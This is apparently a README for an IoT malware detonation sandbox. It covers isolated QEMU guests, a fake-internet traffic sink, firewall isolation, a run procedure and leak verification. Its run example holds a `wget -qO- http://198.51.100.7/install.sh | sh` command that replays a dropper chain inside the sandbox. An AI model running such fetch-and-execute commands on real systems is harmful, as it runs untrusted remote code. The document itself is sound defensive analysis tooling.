# Detonation sandbox

Runs collected IoT samples in disposable QEMU guests on an isolated network
whose only other member is a **traffic sink** that pretends to be the
internet. Developed on Ubuntu 26.04 Desktop; nothing depends on the desktop,
so it runs unchanged on Ubuntu LTS Server.

Nothing on the sandbox network can reach the LAN, the host or the internet:
verified by capturing on the physical NIC during a run (0 frames from guest
MACs or 10.200.0.0/24), see [Verification](#verification).

## Layout

```
                 host (eno1 = LAN)                           no link
   ┌──────────────────────────────────────────────────┐   ┌────────┐
   │  sbx0 bridge (no IPv4, IPv6 off)                  │ ✗ │  eno1  │
   │   ├── sbxtapXXXX  guest 1 ┐ isolated ports:       │   └────────┘
   │   ├── sbxtapYYYY  guest 2 ┘ talk to the sink only │
   │   └── sbx-sinkbr ──veth──► netns sbxsink          │
   │                             eth0 10.200.0.1/24    │
   │                             dnsmasq  DHCP .100-199│
   │                             sink.py  DNS, TCP, UDP│
   └──────────────────────────────────────────────────┘
```

| piece | where | role |
|---|---|---|
| `sbx0` | host | Linux bridge with no host address, no uplink. Guest taps are `isolated` bridge ports, so guests reach the sink but not each other. |
| `inet sbx_host` nft table | host | drops anything entering or leaving the host stack via `sbx*`, and all forwarding to/from `sbx*` (belt and braces: the bridge has no address). |
| `sbxsink` netns | host | holds the sink; no route to the host's own namespace. |
| `nft-sink.nft` | sbxsink | DNATs **every** TCP connection (any IP, any port) to `sink.py :9999`, every UDP DNS query to `:53`, other UDP to `:9998`, and ICMP to any address to the sink itself, so every host "is up". |
| `dnsmasq` | sbxsink | DHCP only: gateway and DNS = 10.200.0.1. |
| `sink.py` | sbxsink, user `sbxsink` | fake internet (below). |
| QEMU | transient unit per run, user `sbx` | guest; `ProtectSystem=strict`, paths in `/etc/sbx/inaccessible` hidden, 1 GB / 64 tasks, rootfs `snapshot=on`. |

## The traffic sink (`sink/sink.py`, `/etc/sbx/rules.json`)

- **DNS:** every name resolves to 10.200.0.1, whichever server the sample
  asks (queries to 8.8.8.8 are DNATed too). AAAA and other types get an
  empty NOERROR (musl fails a whole lookup if AAAA is REFUSED).
  `rules.json` `dns.names` can map a name to another address, e.g. to make a
  domain look like a known C2 IP so IP-based rules match.
- **TCP:** the original destination is recovered with `SO_ORIGINAL_DST`.
  TLS is terminated with a self-signed certificate (so `curl -k` /
  `wget --no-check-certificate` work; the SNI is logged). HTTP is parsed and
  answered from rules: serve a file from `/srv/sandbox/serve`, a fixed body,
  or a status. Other protocols: hold the connection and record what the
  client sends, optionally send a banner or fixed bytes first.
- **UDP:** summarised per source per minute (flood-safe); the pcap has the
  datagrams.
- **Samples to guests:** `GET http://10.200.0.1/_sbx/<path>` serves
  `/srv/sandbox/serve/<path>`.
- **Log:** `/var/lib/sbx/sink/events.jsonl` (one JSON object per DNS query,
  TCP open / first data / close, UDP summary); bodies and client data are
  kept by SHA-256 in `/var/lib/sbx/sink/blobs/`.

Rules are first-match, reloaded on change. Shipped examples: serve files
for a dropper host (documentation address `198.51.100.7`) from the staged
samples, so a download chain can be replayed end to end; hold connections
to a C2-style port and log the handshake (**the sink never sends
commands**); answer IP-lookup
services with `203.0.113.45`, `generate_204` checks, an FTP banner.

## Guests (`guests/`)

OpenWrt 25.12.6 images (busybox userland, close to real router/DVR
targets), one per QEMU machine:

| target | QEMU | runs sample builds |
|---|---|---|
| `x86` | `qemu-system-i386`, KVM | x86, i386–i686 |
| `x86_64` | `qemu-system-x86_64`, KVM | x86_64 |
| `mips` | `qemu-system-mips -M malta` | mips (big-endian) |
| `mipsel` | `qemu-system-mipsel -M malta` | mipsel / mpsl |
| `armv7` | `qemu-system-arm -M virt` | armv6l, armv7l (EABI) |
| `aarch64` | `qemu-system-aarch64 -M virt` | aarch64 |

`sbx-images.py` downloads the kernel and ext4 rootfs, checks them against
the release's `sha256sums`, grows the rootfs and writes an overlay into it
with `debugfs` (no mounts):

- `/etc/uci-defaults/99-sbx`: LAN by DHCP from the sink; dnsmasq, odhcpd,
  firewall, dropbear, uhttpd, NTP off.
- `/usr/libexec/sbx/mon.sh` run by `/usr/libexec/sbx/sh` (a renamed copy of
  the image's busybox): prints one `SBXMON` line per process every 3 s to the
  console, plus `/dev/shm`. Built to survive Mirai-style killers: its path
  avoids common blacklist strings, its argv avoids `ps`/`ss`/`top`, and it
  uses shell builtins only (its `sleep` is a hard link to the same copy).

Guests boot with `snapshot=on`: every run starts from the pristine image and
nothing a sample writes survives.

**Not covered yet:** armv4l/armv5l builds are OABI (`e_flags` EABI0) and
need a kernel with `CONFIG_OABI_COMPAT`; m68k, ppc and sh4 have no OpenWrt
QEMU target (candidates: Debian ports kernels on `q800`, `mac99`/`ppce500`,
`r2d`). Windows samples are out of scope for now.

## Build (repeatable, idempotent)

On a fresh Ubuntu 26.04 (Desktop or Server), from a checkout of this repo
(other recent Debian/Ubuntu releases should work but are untested):

```sh
sudo sh host/install.sh                            # packages, users, /opt/sbx, units
sudo python3 -I /opt/sbx/guests/sbx-images.py      # all guests (or: x86 mips ...)
```

`install.sh`:
1. installs `qemu-system-{x86,arm,mips}`, `qemu-utils`, `dnsmasq-base`,
   `nftables`, `tcpdump`, `e2fsprogs`, `openssl` with
   `--no-install-recommends`. This keeps `qemu-user-binfmt` off the host,
   so a foreign-arch sample can never run on the host by accident. It warns
   if any qemu binfmt handler is registered.
2. creates system users `sbx` (QEMU, in group `kvm`) and `sbxsink`;
3. installs files to `/opt/sbx`, links `/usr/local/sbin/sbx-run`;
4. seeds `/etc/sbx/rules.json` (local edits are kept on re-install) and
   generates the sink's self-signed certificate;
5. creates `/srv/sandbox/{serve,images,runs}` and `/var/lib/sbx/sink`;
6. enables `sbx-net`, `sbx-dnsmasq`, `sbx-sink`.

`sbx-net.sh` refuses to start if `br_netfilter` is active (Docker loads
it): bridged traffic would then hit the host nft table and be dropped.

Stage samples to serve (read-only to the sink), e.g.:

```sh
sudo install -d /srv/sandbox/serve/example/b
sudo install -m 0644 <sample> /srv/sandbox/serve/example/b/mips
```

## Run

```sh
sudo sbx-run --target mips --sample example/b/mips --duration 180
sudo sbx-run --target mips --cmd 'wget -qO- http://198.51.100.7/install.sh | sh' --duration 300
```

`sbx-run` creates an isolated tap, starts a capture, boots the guest,
waits for the console and the DHCP lease, starts the monitor, fetches the
sample from the sink to `/tmp/.b`, runs it (or runs `--cmd`), watches for
`--duration` seconds, stops the monitor, runs `--post` commands if the
console shell survived (default: `dmesg | tail -60`, `/proc/net/tcp|udp`,
`/tmp`, `/dev/shm`), then tears everything down. Output in
`/srv/sandbox/runs/<run-id>/`:

| file | content |
|---|---|
| `console.log` | full serial console: boot, sample stdout, `SBXMON` lines, post commands |
| `capture.pcap00…` | everything to/from the guest MAC on `sbx0` (100 MB × 20 cap) |
| `sink.jsonl` | the sink's events for this guest during the run |
| `dhcp.log` | dnsmasq lines for this guest |
| `run.json` | parameters, image manifest, MAC/IP, timings, sample SHA-256 |

Keep `--post` free of `ps`, `top`, `netstat`, `ss`, `lsof`, `strace`: some
samples kill processes whose command line contains them.

## Verification

Check on the x86 guest:
- `tcpdump -i eno1 'net 10.200.0.0/24 or ether[6:4] = 0x5254005b'` during
  a run that tries the host's own LAN address on :22, another LAN host and
  `8.8.8.8` must show **0 packets**. All three "answer", and the sink logs
  them: they were the sink.
- `inet sbx_host` counters: only the guest's DHCP broadcasts should reach
  the host stack (dropped).
- DNS to an arbitrary server, HTTP by name and IP, HTTPS to an IP literal,
  and ping to arbitrary addresses should all reach the sink.

Repeat after any change to `sbx-net.sh` or the nft files.

## Moving to Ubuntu LTS Server

Nothing here depends on the desktop. Either:
- **In place:** `sudo apt purge ubuntu-desktop-minimal gdm3 && sudo apt autoremove`,
  `sudo systemctl set-default multi-user.target`, reboot; or
- **Fresh Server install:** run the two build commands above, then copy
  back `/etc/sbx/rules.json`, `/srv/sandbox/serve` and (if wanted)
  `/srv/sandbox/runs`.

## Sharing the host with other services

List paths QEMU must never see (credentials, other tools' data), one per
line, in `/etc/sbx/inaccessible`; `sbx-run` hides them from every guest's
QEMU process. For the sink, add a systemd drop-in, e.g.
`/etc/systemd/system/sbx-sink.service.d/local.conf` with
`[Service]` / `InaccessiblePaths=-/path`.
